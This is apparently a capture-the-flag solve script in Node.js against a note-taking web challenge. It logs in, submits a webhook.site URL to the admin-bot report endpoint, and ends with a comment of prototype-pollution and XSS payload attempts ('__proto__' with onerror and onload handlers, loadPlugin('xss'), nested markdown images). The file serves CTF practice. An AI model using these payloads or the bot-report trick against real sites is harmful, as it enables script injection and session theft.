

const fetch = require('node-fetch')

const root = 'http://ctf-note.splitline.tw:9527'

async function main() {
    
    let formData = null;

    formData = new URLSearchParams()
    formData.append('username', `hw`);
    formData.append('password', `hw`);

    let res = await fetch(`${root}/login`, {
        method: 'POST',
        headers: {
            'cookie': ''
        },
        body: formData
    })
    console.log(await res.text())

    console.log(res.headers.raw()['set-cookie'])
    console.log(res.headers.raw())
    let parsedCookies = parseCookies(res)

    formData = new URLSearchParams()
    formData.append('url', `https://webhook.site/54ca75b9-90e6-4e97-b469-4543e26575ca`);

    res = await fetch(`${root}/report`, {
        method: 'POST',
        headers: {
            'cookie': parsedCookies,
        },
        body: formData,
    })

    console.log(res)
}

function parseCookies(response) {
    const raw = response.headers.raw()['set-cookie'];
    return raw.map((entry) => {
        const parts = entry.split(';');
        const cookiePart = parts[0];
        return cookiePart;
    }).join(';');
}

main()


/*
__proto__
nyanCat
https://webhook.site/54ca75b9-90e6-4e97-b469-4543e26575ca

__proto__
id
CONFIG

__proto__
name
plugins

__proto__
href
https://webhook.site/54ca75b9-90e6-4e97-b469-4543e26575ca

Web
img
![alt]()
[alt]()

__proto__
onload
alert(1)

__proto__
onerror
alert(2)

__proto__
onerror
loadPlugin("xss")

[[[](3)](2)](1)
[![](2)](1)


*/
const a = 1
window.a = 2
a == 1 // true

var foo = "foobar";
foo === window.foo; // Returns: true
